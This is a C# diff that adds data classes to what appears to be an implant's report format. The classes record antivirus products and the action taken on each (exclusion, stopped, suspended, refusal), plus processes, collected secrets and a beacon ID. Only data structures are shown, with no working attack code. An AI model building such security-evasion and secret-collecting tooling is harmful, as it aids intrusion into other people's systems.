@@ -11,6 +11,29 @@ public sealed class ErrorRec
     public string Message { get; set; } = "";
 }
 
+public sealed class AvRec
+{
+    public string Name { get; set; } = "";
+    public string Kind { get; set; } = "";        // registrado | servico
+    public string Service { get; set; } = "";
+    public string ServiceState { get; set; } = "";
+    public string StartMode { get; set; } = "";
+    public string ProductState { get; set; } = "";
+    public string Path { get; set; } = "";
+    public string Action { get; set; } = "nada";  // nada | exclusao | parado | suspenso | recusa
+    public string Note { get; set; } = "";
+}
+
+public sealed class ProcRec
+{
+    public int Pid { get; set; }
+    public string Name { get; set; } = "";
+    public string Image { get; set; } = "";
+    public int Parent { get; set; }
+    public string Owner { get; set; } = "";
+}
+
+
 public sealed class MachineRec
 {
     public string Host { get; set; } = "";
@@ -60,6 +83,10 @@ public sealed class SecretRec
 
 public sealed class Report
 {
+    public List<AvRec> Avs { get; } = new();
+    public List<ProcRec> Filters { get; } = new();
+    public string FilterOutput { get; set; } = "";
+    public string AvAction { get; set; } = "desligado";
     public List<SecretRec> Secrets { get; } = new();
     public string RunId { get; init; } = "";
     public string BeaconId { get; init; } = "";
